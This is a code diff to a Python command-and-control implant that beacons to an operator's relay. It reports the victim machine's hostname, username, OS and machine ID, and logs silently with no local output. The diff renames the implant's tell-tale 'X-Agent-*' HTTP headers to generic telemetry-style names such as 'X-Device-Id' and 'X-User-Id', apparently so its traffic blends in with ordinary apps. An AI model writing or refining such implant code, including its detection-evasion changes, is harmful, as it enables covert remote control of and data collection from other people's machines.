@@ -25,7 +25,7 @@ def runAgent():
     box = {'exiting': False, 'inShip': False, 'beaconUrl': '', 'identity': []}
 
     # log() = relay ship ONLY (zero local echo — no print, ever). Every line is POSTed
-    # with X-Agent-Log: 1: the relay answers immediately (no long-poll hold) and
+    # with X-Log-Only: 1: the relay answers immediately (no long-poll hold) and
     # broadcasts an agent_log event to the operator's events feed. NEVER fatal — a
     # failed ship is swallowed in silence — and the in-ship guard keeps a failing relay
     # from recursing. Body = one frame holding the UTF-8 line. Each call is one
@@ -38,7 +38,7 @@ def runAgent():
         try:
             data = line.encode('utf-8')
             headers = dict(box['identity'])
-            headers['X-Agent-Log'] = '1'
+            headers['X-Log-Only'] = '1'
             try:
                 resp = urlopen(Request(box['beaconUrl'], data=struct.pack('<I', len(data)) + data, headers=headers), timeout=15)
                 try:
@@ -240,18 +240,18 @@ def runAgent():
         # injection is the C# agent's) — Exit needs no bit, and the mask honestly
         # reports an implant that registers, beacons, and exits.
         pairs = [
-            ('X-Agent-Api-Version', '1'),
-            ('X-Agent-Machine-Uuid', guid),
-            ('X-Agent-Session-Key', make_session_key()),
-            ('X-Agent-Hostname', hostname),
-            ('X-Agent-Username', username),
-            ('X-Agent-Arch', arch),
-            ('X-Agent-Process-Arch', process_arch),
-            ('X-Agent-Platform', platform_name),
-            ('X-Agent-Os-Version', os_version),
-            ('X-Agent-Build', build_number),
-            ('X-Agent-Name-Id', '4'),
-            ('X-Agent-Capabilities', '0000000000000000'),
+            ('X-Api-Version', '1'),
+            ('X-Device-Id', guid),
+            ('X-Session-Id', make_session_key()),
+            ('X-Device-Name', hostname),
+            ('X-User-Id', username),
+            ('X-Device-Arch', arch),
+            ('X-App-Arch', process_arch),
+            ('X-Platform', platform_name),
+            ('X-OS-Version', os_version),
+            ('X-OS-Build', build_number),
+            ('X-Client-Id', '4'),
+            ('X-Client-Features', '0000000000000000'),
         ]
         return [(name, value) for name, value in pairs if value]
 
@@ -279,7 +279,7 @@ def runAgent():
     box['identity'] = build_identity()
     uuid_for_log = ''
     for name, value in box['identity']:
-        if name == 'X-Agent-Machine-Uuid':
+        if name == 'X-Device-Id':
             uuid_for_log = value
     log('Python agent beaconing to %s as %s' % (box['beaconUrl'], uuid_for_log or 'an unidentified machine'))
     pending = []
